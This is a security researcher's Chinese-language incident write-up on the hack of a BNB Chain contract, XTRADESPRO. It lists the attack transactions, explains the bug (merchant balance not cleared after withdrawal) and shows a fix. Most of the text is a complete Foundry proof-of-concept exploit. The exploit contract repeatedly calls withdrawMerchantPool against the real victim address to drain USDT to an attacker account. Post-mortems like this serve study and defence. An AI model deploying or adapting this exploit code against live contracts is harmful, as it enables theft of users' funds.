- tx:https://bscscan.com/tx/0xbb588773fdd428c4b805c79aa534837bfccf2b00f3ffd73518d6642e5679602e
- blocksec: https://app.blocksec.com/explorer/tx/bsc/0xbb588773fdd428c4b805c79aa534837bfccf2b00f3ffd73518d6642e5679602e  ![](media/Pasted%20image%2020251021235431.png) 
- 漏洞合约： https://bscscan.com/address/0xb9d195022da410970676dc31e4abbc19063dd158
- 攻击合约反编译： https://app.dedaub.com/binance/address/0x0a289149371b10905a1b35be5ce7b51c24165754/decompiled 

- TX: 
```
0xbb588773fdd428c4b805c79aa534837bfccf2b00f3ffd73518d6642e5679602e - [64509653](https://bscscan.com/block/64509653)
0xd273e2f8bd31797c363a2ca6483aac1aa554cc2be8d6681f0447635ee173097e - [64509654](https://bscscan.com/block/64509654)
0x63be1c92331c31d6e081afedd3e32eff628e4fe91a82ca307b4f42b6ce01620e
```
 - 第一个黑客： https://app.blocksec.com/explorer/tx/bsc/0x63be1c92331c31d6e081afedd3e32eff628e4fe91a82ca307b4f42b6ce01620e 
	 - https://bscscan.com/address/0x0a289149371b10905a1b35be5ce7b51c24165754#tokentxns  ![](media/Pasted%20image%2020251022023316.png)  
 - 第二个Hacker: https://app.blocksec.com/explorer/tx/bsc/0xd311384b1913b35e4261d4b5a353962c869ce7caf710f5fce02ad007ad998047?line=156 
	 - https://bscscan.com/tokentxns?a=0x6f68a80f86b1dbdb44b6d865536317f6f8239db5&ps=100&p=30 ![](media/Pasted%20image%2020251022023328.png)  

## Audit
关键漏洞代码：
```sol
function withdrawMerchantPool() external nonReentrant isActiveMerchant {
    MerchantData storage merchant = merchants[msg.sender];
    require(merchant.balance < usdtToken.balanceOf(address(this)), "Not enough balance");
    require(merchant.balance > minWithdraw, "Minimum withdrawal");
    require(usdtToken.transfer(msg.sender, merchant.balance), "Transfer failed");
    totalWithdrawals += merchant.balance;
    // merchant.balance 商户的内部余额 merchant.balance未清零
    emit Transfer('merchantpool', address(this), msg.sender, merchant.balance);
}
```
- 在调用 `usdtToken.transfer`之后，代码并没有将商户的内部余额 `merchant.balance`清零。
- Fix
```sol
function withdrawMerchantPool() external nonReentrant isActiveMerchant {
    MerchantData storage merchant = merchants[msg.sender];
    uint256 amountToSend = merchant.balance; // 先记录要转账的金额

    require(amountToSend <= usdtToken.balanceOf(address(this)), "Not enough balance");
    require(amountToSend > minWithdraw, "Below minimum withdrawal");

    merchant.balance = 0; // 效果：在交互前更新状态（清零余额）
    totalWithdrawals += amountToSend; // 更新总提现额

    require(usdtToken.transfer(msg.sender, amountToSend), "Transfer failed"); // 交互：最后进行外部调用

    emit Transfer('merchantpool', address(this), msg.sender, amountToSend);
}
```

## EXP

### 不使用闪电贷
![](media/Pasted%20image%2020251023182137.png)    
```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IXTRADESPRO {
    function withdrawMerchantPool() external;
    function register(address referrer, address merchant) external ;
    function activateMerchant(string memory country) external;
    function transferMerchantPool() external;
}

contract AttackerV2 is Test {
    // 受害者合约地址
    address private constant VICTIM_CONTRACT = 0xB9D195022da410970676DC31E4aBBc19063DD158;
    address private constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
    address public ATTACKER_EOA;
    
    constructor(address _attackerEOA) {
        ATTACKER_EOA = _attackerEOA;
    }
    
    // 接收ETH函数
    receive() external payable {}
    
    // 攻击函数 - 直接执行攻击逻辑
    function attack() public {
        require(msg.sender == ATTACKER_EOA, "Only attacker EOA can call this function");
        
        // 直接执行攻击逻辑
        _executeAttack();
    }
    
    // 实际攻击执行函数
    function _executeAttack() internal {
        // 确保合约拥有足够的USDT余额
        uint256 contractBalance = IERC20(USDT_TOKEN).balanceOf(address(this));
        console.log(unicode"合约USDT余额:", contractBalance / 1e18);
        
        // 尝试注册和激活商户 
        // 注册用户 - 使用从交易数据中获取的地址
        IXTRADESPRO(VICTIM_CONTRACT).register(address(0x85aAAff4Db7B629b1e868231B411E53976a193eF), address(0xeA9471470d3389F1EFe9C2142a172E3907DC612F));
        
        // 首先授权受害者合约使用足够的USDT来支付注册费和商户费
        IERC20(USDT_TOKEN).approve(VICTIM_CONTRACT, type(uint256).max);
        // 激活商户
        IXTRADESPRO(VICTIM_CONTRACT).activateMerchant("hiroki");

        // 调用transferMerchantPool分配资金到商户池
        IXTRADESPRO(VICTIM_CONTRACT).transferMerchantPool();

        // 循环调用受害者合约的withdrawMerchantPool函数多次
        // 根据原始攻击合约，实际调用了100次
        for (uint256 i = 0; i < 270; i++) {
            try IXTRADESPRO(VICTIM_CONTRACT).withdrawMerchantPool() {
                continue;
            } catch {
                console.log(unicode"提取资金失败，退出循环",i);
                break;
            }
        }
        
        // 将资金转移给攻击者EOA
        uint256 remainingBalance = IERC20(USDT_TOKEN).balanceOf(address(this));
        if (remainingBalance > 0) {
            IERC20(USDT_TOKEN).transfer(ATTACKER_EOA, remainingBalance);
        }
        
        console.log(unicode"攻击执行完成，资金已转移给攻击者EOA");
    }
}

contract XTRADESPROExploitTestV2 is Test {
   address public ATTACKER_EOA;
   // 合约地址 (使用正确的校验和格式)
    address private constant VICTIM_CONTRACT = 0xB9D195022da410970676DC31E4aBBc19063DD158;
    address private constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
    
    address private constant USDT_WHALE = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE; // USDT持有者地址
    
    // 攻击合约实例
    AttackerV2 private attacker;
    
    function setUp() public {
        vm.createSelectFork("https://virtual.binance.eu.rpc.tenderly.co/d6bf3f88-f9d8-493e-b759-7e92f6587bc9", 64509651);
        // 部署攻击合约

        ATTACKER_EOA = makeAddr("ATTACKER_EOA");
        vm.prank(ATTACKER_EOA);
        attacker = new AttackerV2(ATTACKER_EOA);
        
        // 给攻击合约设置初始BNB用于支付Gas
        vm.deal(address(attacker), 10 ether);
        
        // 给攻击合约转入一些USDT用于支付费用
        vm.prank(USDT_WHALE);
        IERC20(USDT_TOKEN).transfer(address(attacker), 10000 * 1e18);
    }
    
    function testExploit() public {
        // 记录攻击前余额
        uint256 attackerBalanceBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER_EOA);
        uint256 contractBalanceBefore = IERC20(USDT_TOKEN).balanceOf(VICTIM_CONTRACT);

        console.log(unicode"攻击前状态:");
        console.log(unicode"攻击者EOA Token余额:", attackerBalanceBefore / 1e18);
        console.log(unicode"受害者合约Token余额:", contractBalanceBefore / 1e18);

        // 执行攻击
        vm.startPrank(ATTACKER_EOA);
        attacker.attack();
        vm.stopPrank();

        // 记录攻击后余额
        uint256 attackerBalanceAfter = IERC20(USDT_TOKEN).balanceOf(ATTACKER_EOA);
        uint256 contractBalanceAfter = IERC20(USDT_TOKEN).balanceOf(VICTIM_CONTRACT);

        console.log(unicode"攻击后状态:");
        console.log(unicode"攻击者EOA Token余额:", attackerBalanceAfter / 1e18);
        console.log(unicode"受害者合约Token余额:", contractBalanceAfter / 1e18);

        // 计算总获利（攻击者EOA余额 - 初始投入）
        uint256 initialInvestment = 26712204771447245411336;
        uint256 profit = attackerBalanceAfter - initialInvestment; // 减去初始投入的2万Token
        
        console.log(unicode"总投入(Token):", initialInvestment / 1e18);
        console.log(unicode"总获利(Token):", profit / 1e18);
        
        console.log(unicode"攻击测试完成!");
    }
}
```

### 使用闪电贷 --- 之后补充
## Glider

- https://glide.gitbook.io/main/glider-ide
- https://glide.r.xyz/
- https://github.com/Hexens/glider-docs
	- https://deepwiki.com/Hexens/glider-docs
- https://github.com/ustas-eth/daily-glider
	- https://deepwiki.com/ustas-eth/daily-glider


- https://deepwiki.com/search/-audit-sol-function-withdrawme_a51c8eae-a514-4a1d-8dae-15c521579423

